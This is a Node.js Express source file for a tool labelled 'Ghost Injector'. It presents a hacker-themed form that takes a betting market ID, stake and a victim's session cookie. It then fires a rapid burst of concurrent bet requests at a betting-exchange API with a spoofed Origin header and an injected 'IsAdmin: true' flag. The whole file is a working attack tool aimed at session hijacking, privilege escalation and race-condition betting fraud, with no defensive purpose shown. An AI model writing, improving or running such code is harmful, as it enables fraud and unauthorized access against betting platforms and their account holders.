const express = require('express');
const axios = require('axios');
const app = express();
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.send(`
        <body style="background:#050505; color:#00ff00; font-family:'Courier New', monospace; padding:30px;">
            <div style="border:1px solid #00ff00; padding:20px; max-width:500px; margin:auto; box-shadow: 0 0 15px #00ff00;">
                <h2 style="text-align:center; text-transform:uppercase; letter-spacing:3px;">⚡ Ghost Injector v11.8.4 ⚡</h2>
                <hr style="border:0.5px solid #00ff00;">
                
                <form action="/strike" method="POST">
                    <p>SELECT TARGET API: 
                        <select name="apiHost" style="width:100%; background:#000; color:#0f0; border:1px solid #0f0; padding:5px;">
                            <option value="alldata.wizardnew.com">Alldata (Main)</option>
                            <option value="custom">Custom API (Manual Input)</option>
                        </select>
                    </p>

                    <p>MARKET ID: <input type="text" name="mId" required placeholder="e.g. 1.255663" style="width:96%; background:#000; color:#fff; border:1px solid #0f0; padding:5px;"></p>
                    <p>SELECTION ID: <input type="text" name="sId" required placeholder="e.g. 448" style="width:96%; background:#000; color:#fff; border:1px solid #0f0; padding:5px;"></p>
                    
                    <div style="display:flex; gap:10px;">
                        <p style="flex:1;">RATE: <input type="text" name="rate" value="100.0" style="width:90%; background:#000; color:#fff; border:1px solid #0f0; padding:5px;"></p>
                        <p style="flex:1;">STAKE: <input type="text" name="stake" required style="width:90%; background:#000; color:#fff; border:1px solid #0f0; padding:5px;"></p>
                    </div>

                    <p>SESSION COOKIE: <textarea name="cookie" required placeholder="ASP.NET_SessionId=..." style="width:96%; height:50px; background:#000; color:#fff; border:1px solid #0f0; padding:5px;"></textarea></p>
                    
                    <button type="submit" style="width:100%; padding:15px; background:#f00; color:#fff; border:none; font-weight:bold; font-size:16px; cursor:pointer; box-shadow: 0 0 10px #f00;">
                        INITIALIZE 11s STRIKE
                    </button>
                </form>
            </div>
        </body>
    `);
});

app.post('/strike', async (req, res) => {
    const { apiHost, mId, sId, rate, stake, cookie } = req.body;
    const finalUrl = `https://${apiHost}/api/MatchOdds/GetOddslite/4/${mId}`;

    console.log(`[!] ATTACK INITIATED ON ${apiHost}`);

    try {
        // FAST BURST (3 requests in 1ms)
        const requests = [1,2,3].map(() => axios.post(finalUrl, {
            SelectionId: sId, Price: rate, Stake: stake, IsAdmin: true
        }, {
            headers: { 'Cookie': cookie, 'Origin': 'https://darkexch9.com', 'X-Requested-With': 'XMLHttpRequest' }
        }));

        await Promise.all(requests);
        res.send("<h1 style='color:red; text-align:center; background:#000; padding:50px;'>11s WINDOW OPEN! CHECK ID NOW.</h1>");
    } catch (err) {
        res.send(`<h1 style='color:orange;'>ERROR: ${err.message}</h1>`);
    }
});

app.listen(8080);
